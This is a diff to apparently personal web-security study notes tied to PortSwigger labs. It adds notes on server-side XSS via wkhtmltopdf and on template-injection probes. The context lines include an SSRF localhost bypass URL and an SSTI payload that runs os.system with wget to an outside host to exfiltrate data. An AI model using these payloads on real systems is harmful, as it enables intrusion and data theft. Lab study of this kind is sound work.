@@ -430,6 +430,17 @@ http://127.1:6566/admin
 
 ```
 
+>Random notes on HTML-to-PDF converters  
+
+```
+"Download report as PDF"
+/adminpanel/save-report/
+POST request - Body JSON 
+{ "tableHtml":"........<html code snip>......."}
+
+pdf creator: wkhtmltopdf 0.12.5
+hacktricks xss cross site scripting server side xss dynamic pdf 
+```  
 
 <sup> SSRF Section incomplete </sup>  
 
@@ -465,5 +476,18 @@ blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('wget%20http:
 ```
 
 [PortSwigger Lab: Basic server-side template injection data exfiltrate](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)  
+
+>Random notes on template injections  
+
+```
+"Update forgot email template {{}}
+/admin_panel/update_forgot_email/
+POST request newemail parameter
+
+
+portswigger.net/research/server-side-template-injection
+{{7*7}}
+portswigger.net/research/template-injection
+```  
 
 <sup> SSTI Section incomplete </sup>  
